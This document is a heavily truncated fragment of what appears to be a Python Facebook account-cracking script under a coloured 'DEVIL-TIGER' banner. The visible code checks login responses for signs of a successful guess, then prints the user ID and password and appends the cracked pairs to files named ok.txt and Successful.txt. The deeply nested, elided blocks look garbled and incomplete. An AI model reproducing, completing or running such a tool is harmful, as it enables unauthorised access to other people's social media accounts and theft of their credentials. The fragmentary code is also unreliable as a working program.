...
\033[1;91m @@@•••••••••••••••••••••••••@@@ \033[1;0m
\033[1;97m @@@•••••••••••••••••••••••••@@@ \033[1;0m
\033[1;91m @@@••••••••••DEVIL•••••••@@@ \033[1;0m
\033[1;97m @@@••••••••••TIGER•••••••@@@ \033[1;0m
\033[1;91m @@@•••••••••••••••••••••••••@@@ \033[1;0m
\033[1;97m @@@•••••••••••••••••••••••••@@@ \033[1;0m
\033[1;91m @@@•••••••••••••••••••••••••@@@ \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : DEVIL-TIGER
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[Successful] "+uid+" | "+pass2)
							ok = open("ok.txt","a")
							ok.write(uid+" | "+pass2+"\n")
							ok.close()
							oks.append(uid+pass2)
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[Successful] "+uid+" | "+pass4)
											ok = open("ok.txt","a")
											ok.write(uid+" | "+pass4+"\n")
											ok.close()
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[Successful] "+uid+" | "+pass3+"\033[0;97m")
									ok = open("Successful.txt","a")
									ok.write(uid+" | "+pass3+"\n")
									ok.close()
									oks.append(uid+pass3)
